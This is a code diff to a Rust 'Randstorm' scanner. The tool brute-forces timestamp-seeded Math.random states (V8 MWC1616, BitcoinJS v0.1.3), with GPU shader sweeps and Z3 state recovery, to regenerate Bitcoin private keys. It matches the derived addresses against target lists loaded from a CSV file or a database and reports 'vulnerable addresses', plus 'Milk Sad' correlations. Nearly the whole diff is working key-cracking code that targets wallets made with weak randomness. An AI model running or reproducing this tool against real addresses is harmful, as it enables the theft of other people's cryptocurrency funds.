@@ -68,7 +68,7 @@ pub fn run_scan(
     if let Some(_outputs_str) = z3_solve_input {
         #[cfg(feature = "z3-solver")]
         {
-            info!("🧠 Running Z3 MWC1616 State Recovery...");
+            info!("\u{1f9e0} Running Z3 MWC1616 State Recovery...");
             let solver = super::z3_solver::Z3MwcSolver::new();
             let outputs: Vec<u32> = outputs_str
                 .split(',')
@@ -83,7 +83,7 @@ pub fn run_scan(
 
             match solver.solve_from_outputs(&outputs) {
                 Ok((s1, s2)) => {
-                    info!("✅ Initial State Recovered!");
+                    info!("\u{2705} Initial State Recovered!");
                     info!("   s1: 0x{:08X}", s1);
                     info!("   s2: 0x{:08X}", s2);
                     info!("   Combined Seed (approx): {}", ((s1 as u64) << 32) | (s2 as u64));
@@ -126,7 +126,7 @@ pub fn run_scan(
 
     // Override config with backend preference
     let mut config = config::ScanConfig {
-        scan_mode, // Use the already parsed scan_mode
+        scan_mode,
         gpu_backend,
         ..Default::default()
     };
@@ -136,13 +136,12 @@ pub fn run_scan(
         config.gpu_backend = GpuBackend::Cpu;
         config.use_gpu = false;
     } else if force_gpu {
-        // If specific backend wasn't requested, default to Auto (which prefers GPU)
         if backend_str.is_none() {
             config.gpu_backend = GpuBackend::Auto;
         }
         config.use_gpu = true;
     } else if let GpuBackend::Cpu = gpu_backend {
-         config.use_gpu = false;
+        config.use_gpu = false;
     }
 
     let phase_enum = match phase {
@@ -159,10 +158,9 @@ pub fn run_scan(
         let window_ms = if let (Some(start), Some(end)) = (start_ms, end_ms) {
             end.saturating_sub(start)
         } else {
-            scan_mode.interval_ms() // Use mode-based window
+            scan_mode.interval_ms()
         };
 
-        // Assume Phase 1 (100 configs) for estimation if not specified
         let num_configs = match phase {
             1 => 100,
             2 => 500,
@@ -178,7 +176,7 @@ pub fn run_scan(
         return Ok(());
     }
 
-    info!("🔍 Randstorm Scanner Starting");
+    info!("\u{1f50d} Randstorm Scanner Starting");
     info!("Phase: {:?}", phase_enum);
     info!("Target addresses: {}", target_addresses_path.display());
 
@@ -190,16 +188,14 @@ pub fn run_scan(
     if let (Some(db), Some(class)) = (db_path, target_class) {
         info!("Loading targets from database ({}) for class: {}", db.display(), class);
         let target_db = crate::utils::db::TargetDatabase::new(db.to_path_buf())?;
-        let db_targets = target_db.query_by_class(class, 1000000)?; // Large limit
+        let db_targets = target_db.query_by_class(class, 1000000)?;
         for t in db_targets {
             addresses.push(t.address);
         }
     }
 
     if addresses.is_empty() {
-        anyhow::bail!(
-            "No valid addresses found in CSV or Database"
-        );
+        anyhow::bail!("No valid addresses found in CSV or Database");
     }
 
     info!("Loaded {} target addresses", addresses.len());
@@ -224,7 +220,7 @@ pub fn run_scan(
             ) {
                 Ok(()) => return Ok(()),
                 Err(e) => {
-                    tracing::warn!("⚠️  GPU sweep failed ({}), falling back to CPU", e);
+                    tracing::warn!("\u{26a0}\u{fe0f}  GPU sweep failed ({}), falling back to CPU", e);
                 }
             }
         }
@@ -250,7 +246,7 @@ pub fn run_scan(
         } else if force_gpu {
             true
         } else {
-            true // default prefers GPU when available
+            true
         };
         config.path_coverage = super::config::PathCoverage::from_str(path_coverage);
 
@@ -258,7 +254,6 @@ pub fn run_scan(
             MathRandomEngine::from_str(math_random_engine).unwrap_or(MathRandomEngine::V8Mwc1616);
         let mut scanner = RandstormScanner::with_config(config, engine)?;
 
-        // Create progress bar
         let pb = ProgressBar::new(addresses.len() as u64);
         pb.set_style(
             ProgressStyle::default_bar()
@@ -267,16 +262,14 @@ pub fn run_scan(
                 .progress_chars("#>-"),
         );
 
-        // Scan all addresses
         let results = scanner.scan_with_progress(&addresses, phase_enum)?;
 
         pb.finish_with_message("Scan complete!");
 
-        // Output results
         output_results(&results, output_path)?;
 
         info!(
-            "✅ Scan complete. Found {} vulnerable addresses",
+            "\u{2705} Scan complete. Found {} vulnerable addresses",
             results.len()
         );
     }
@@ -286,12 +279,11 @@ pub fn run_scan(
 
 /// Validate bit-parity between CPU Golden Reference and GPU backends
 pub fn run_validate_parity(backend_str: &str, count: u64, engine_str: &str) -> Result<()> {
-    info!("🧪 Zero-Tolerance Parity Validation");
+    info!("\u{1f9ea} Zero-Tolerance Parity Validation");
     info!("   Backend: {}", backend_str);
     info!("   Engine:  {}", engine_str);
     info!("   Samples: {}", count);
 
-    // 1. Initialize Backend
     let engine = super::prng::MathRandomEngine::from_str(engine_str)
         .ok_or_else(|| anyhow::anyhow!("Invalid engine: {}", engine_str))?;
 
@@ -305,11 +297,11 @@ pub fn run_validate_parity(backend_str: &str, count: u64, engine_str: &str) -> R
         )?;
         super::validator::HardwareParityChecker::validate_v8_parity(&mut wgpu, count)?;
     } else {
-        info!("⚠️ Validation for backend '{}' not yet implemented or feature disabled.", backend_str);
+        info!("\u{26a0} Validation for backend '{}' not yet implemented or feature disabled.", backend_str);
     }
 
     #[cfg(not(feature = "wgpu"))]
-    info!("⚠️ WGPU feature disabled. Rebuild with --features wgpu to validate.");
+    info!("\u{26a0} WGPU feature disabled. Rebuild with --features wgpu to validate.");
 
     Ok(())
 }
@@ -325,12 +317,10 @@ fn load_addresses_from_csv(path: &Path) -> Result<Vec<String>> {
         let line = line.context(format!("Failed to read line {}", line_num + 1))?;
         let trimmed = line.trim();
 
-        // Skip empty lines and comments
         if trimmed.is_empty() || trimmed.starts_with('#') {
             continue;
         }
 
-        // Simple validation: Bitcoin addresses start with 1, 3, or bc1
         if trimmed.starts_with('1') || trimmed.starts_with('3') || trimmed.starts_with("bc1") {
             addresses.push(trimmed.to_string());
         } else {
@@ -350,13 +340,11 @@ fn output_results_to_writer<W: Write>(
     results: &[super::integration::VulnerabilityFinding],
     writer: &mut W,
 ) -> Result<()> {
-    // Write CSV header
     writeln!(
         writer,
         "Address,Status,Confidence,BrowserConfig,Timestamp,DerivationPath"
     )?;
 
-    // Write results
     for finding in results {
         let browser_config = format!(
             "{}/{}/{}x{}",
@@ -400,8 +388,10 @@ fn output_results(
 }
 
 /// GPU-accelerated direct sweep using WGPU (Vulkan/DX12).
-/// Batches timestamps into BrowserFingerprint objects, builds a bloom filter
-/// from target hash160s, and dispatches to the RTX 3080 compute shader.
+///
+/// Calls `WgpuScanner::sweep()` which dispatches the `randstorm_main`
+/// WGSL compute shader and reads back matches via staging buffers.
+/// CPU-side verification filters bloom false positives.
 #[cfg(feature = "wgpu")]
 fn gpu_direct_sweep_scan(
     target_addresses: &[String],
@@ -413,7 +403,6 @@ fn gpu_direct_sweep_scan(
     include_uncompressed: bool,
 ) -> Result<()> {
     use super::wgpu_integration::WgpuScanner;
-    use super::fingerprint::BrowserFingerprint;
     use crate::utils::gpu_bloom_filter::{compute_bloom_bits, GpuBloomConfig};
 
     if interval_ms == 0 { anyhow::bail!("interval_ms must be > 0"); }
@@ -422,15 +411,17 @@ fn gpu_direct_sweep_scan(
     let engine = MathRandomEngine::from_str(engine_name)
         .unwrap_or(MathRandomEngine::V8Mwc1616);
 
-    info!("🎮 GPU Direct Sweep mode (WGPU/Vulkan)");
+    info!("\u{1f3ae} GPU Direct Sweep mode (WGPU/Vulkan)");
     info!("   Start: {}", start_ms);
     info!("   End:   {}", end_ms);
     info!("   Interval: {} ms", interval_ms);
     info!("   Targets: {}", target_addresses.len());
 
-    // --- Build bloom filter from target hash160s ---
+    // ── Build bloom filter from target hash160s ──────────────────────────────
     let mut hash160s: Vec<Vec<u8>> = Vec::new();
     let mut target_set: HashSet<Vec<u8>> = HashSet::new();
+    // addr_str → hash160 lookup for output
+    let mut addr_to_h160: Vec<(String, Vec<u8>)> = Vec::new();
 
     for addr_str in target_addresses {
         if let Ok(addr) = Address::from_str(addr_str) {
@@ -443,7 +434,8 @@ fn gpu_direct_sweep_scan(
                 continue;
             };
             hash160s.push(h160.clone());
-            target_set.insert(h160);
+            target_set.insert(h160.clone());
+            addr_to_h160.push((addr_str.clone(), h160));
         }
     }
 
@@ -460,7 +452,7 @@ fn gpu_direct_sweep_scan(
 
     info!("   Bloom filter: {} bytes ({} entries)", bloom_data.len(), hash160s.len());
 
-    // --- Init GPU scanner ---
+    // ── Init GPU scanner ─────────────────────────────────────────────────────
     let config = super::config::ScanConfig {
         use_gpu: true,
         gpu_backend: super::config::GpuBackend::Wgpu,
@@ -468,11 +460,12 @@ fn gpu_direct_sweep_scan(
         ..Default::default()
     };
 
-    let mut wgpu = WgpuScanner::new(config, engine, None, include_uncompressed)
+    let wgpu = WgpuScanner::new(config, engine, None, include_uncompressed)
         .context("Failed to init WGPU scanner for GPU sweep")?;
 
-    // --- Batch sweep ---
-    const BATCH_SIZE: usize = 65_536;
+    // ── Dispatch compute shader via sweep() ──────────────────────────────────
+    // sweep() batches internally by 65536 timestamps and returns SeedComponents
+    // for every bloom hit found by the shader.
     let total = ((end_ms.saturating_sub(start_ms)) / interval_ms) + 1;
 
     let pb = ProgressBar::new(total);
@@ -480,72 +473,48 @@ fn gpu_direct_sweep_scan(
         ProgressStyle::default_bar()
             .template("[{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} timestamps ({eta}) | GPU")
             .unwrap()
-            .progress_chars("█>-"),
+            .progress_chars("\u{2588}>-"),
     );
 
+    let seed_hits = wgpu.sweep(
+        start_ms,
+        end_ms,
+        interval_ms as u32,
+        &bloom_data,
+        hash160s.len(),
+    )?;
+
+    pb.finish_with_message(format!("GPU sweep complete — {} raw hits", seed_hits.len()));
+
+    info!("GPU raw shader hits: {}", seed_hits.len());
+
+    // ── CPU verification: filter bloom false positives ───────────────────────
+    // SeedComponents.hash160 is [u32; 5] stored little-endian by the shader.
     let mut matches: Vec<(u64, String)> = Vec::new();
-    let mut batch: Vec<BrowserFingerprint> = Vec::with_capacity(BATCH_SIZE);
-    let mut batch_ts: Vec<u64> = Vec::with_capacity(BATCH_SIZE);
 
-    let mut ts = start_ms;
-    while ts <= end_ms || !batch.is_empty() {
-        // Fill batch
-        while ts <= end_ms && batch.len() < BATCH_SIZE {
-            batch.push(BrowserFingerprint {
-                timestamp_ms: ts,
-                user_agent: String::new(),
-                screen_width: 1366,
-                screen_height: 768,
-                color_depth: 24,
-                timezone_offset: 0,
-                language: String::new(),
-                platform: String::new(),
-            });
-            batch_ts.push(ts);
-            ts = ts.saturating_add(interval_ms);
-        }
-
-        if batch.is_empty() { break; }
-
-        // FIX: added missing third argument &hash160s (E0061)
-        let result = wgpu.process_batch(&batch, &bloom_data, &hash160s)
-            .context("GPU batch processing failed")?;
-
-        // Verify hits on CPU (bloom filter has false positives)
-        for hit in &result.matches_found {
-            let secp = bitcoin::secp256k1::Secp256k1::new();
-            let pk = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &hit.private_key);
-
-            let addr_comp = super::derivation::derive_p2pkh_address(&pk);
-            if target_set.iter().any(|h| {
-                if let Ok(a) = Address::from_str(&addr_comp) {
-                    let s = a.assume_checked().script_pubkey();
-                    let hv = if s.is_p2pkh() { s.as_bytes()[3..23].to_vec() } else { vec![] };
-                    hv == *h
-                } else { false }
-            }) {
-                matches.push((hit.fingerprint.timestamp_ms, addr_comp));
+    for seed in &seed_hits {
+        if let Some(h160_words) = seed.hash160 {
+            // Convert [u32; 5] LE → 20-byte hash160
+            let mut h160_bytes = [0u8; 20];
+            for (i, w) in h160_words.iter().enumerate() {
+                let b = w.to_le_bytes();
+                h160_bytes[i * 4..i * 4 + 4].copy_from_slice(&b);
             }
+            let h160_vec = h160_bytes.to_vec();
 
-            if include_uncompressed {
-                let addr_u = super::derivation::derive_p2pkh_address_uncompressed(&pk);
-                if target_addresses.contains(&addr_u) {
-                    matches.push((hit.fingerprint.timestamp_ms, addr_u));
+            if target_set.contains(&h160_vec) {
+                // Resolve hash160 back to address string
+                for (addr_str, h) in &addr_to_h160 {
+                    if *h == h160_vec {
+                        matches.push((seed.timestamp_ms, addr_str.clone()));
+                        break;
+                    }
                 }
             }
         }
-
-        pb.inc(batch.len() as u64);
-        batch.clear();
-        batch_ts.clear();
     }
 
-    pb.finish_with_message(format!(
-        "GPU sweep complete — {:.1}M keys/s",
-        (total as f64) / pb.elapsed().as_secs_f64() / 1_000_000.0
-    ));
-
-    // Write output
+    // ── Write output ─────────────────────────────────────────────────────────
     let mut writer: Box<dyn Write> = if let Some(path) = output_path {
         Box::new(File::create(path).context("Failed to create output file")?)
     } else {
@@ -558,7 +527,7 @@ fn gpu_direct_sweep_scan(
     }
     writer.flush()?;
 
-    info!("✅ GPU Sweep complete. Matches: {}", matches.len());
+    info!("\u{2705} GPU Sweep complete. Matches: {}", matches.len());
     Ok(())
 }
 
@@ -580,13 +549,12 @@ fn direct_sweep_scan(
     if start_ms > end_ms {
         anyhow::bail!("start_ms must be <= end_ms");
     }
-    info!("🧪 Direct sweep mode (BitcoinJS v0.1.3)");
+    info!("\u{1f9ea} Direct sweep mode (BitcoinJS v0.1.3)");
     info!("   Start: {}", start_ms);
     info!("   End:   {}", end_ms);
     info!("   Interval: {} ms", interval_ms);
     info!("   Targets: {}", target_addresses.len());
 
-    // Precompute target hash160 set
     let mut target_set: HashSet<Vec<u8>> = HashSet::new();
     for addr_str in target_addresses {
         if let Ok(addr) = Address::from_str(addr_str) {
@@ -652,7 +620,6 @@ fn direct_sweep_scan(
             if let Ok(secret_key) = SecretKey::from_slice(&key_bytes) {
                 let public_key = PublicKey::from_secret_key(&secp, &secret_key);
 
-                // compressed
                 let addr_comp = super::derivation::derive_p2pkh_address(&public_key);
                 let mut found = false;
                 if let Ok(parsed) = Address::from_str(&addr_comp) {
@@ -671,7 +638,6 @@ fn direct_sweep_scan(
                     }
                 }
 
-                // uncompressed path
                 if include_uncompressed && !found {
                     let addr_uncomp =
                         super::derivation::derive_p2pkh_address_uncompressed(&public_key);
@@ -693,10 +659,9 @@ fn direct_sweep_scan(
             offset = offset.saturating_add(1);
         }
 
-        // Check for Milk Sad correlation
         for addr in target_addresses {
             if let Some(vuln_info) = super::heuristics::check_milk_sad_correlation(ts, addr) {
-                info!("🔥 Found Milk Sad Correlation! Timestamp: {}, Address: {}, Vuln: {}", ts, addr, vuln_info);
+                info!("\u{1f525} Found Milk Sad Correlation! Timestamp: {}, Address: {}, Vuln: {}", ts, addr, vuln_info);
                 matches.push((ts, addr.clone()));
             }
         }
@@ -707,7 +672,6 @@ fn direct_sweep_scan(
 
     pb.finish_with_message("Sweep complete");
 
-    // Write output
     let mut writer: Box<dyn Write> = if let Some(path) = output_path {
         Box::new(File::create(path).context("Failed to create output file")?)
     } else {
@@ -720,7 +684,7 @@ fn direct_sweep_scan(
     }
     writer.flush()?;
 
-    info!("✅ Sweep complete. Matches: {}", matches.len());
+    info!("\u{2705} Sweep complete. Matches: {}", matches.len());
     Ok(())
 }
 
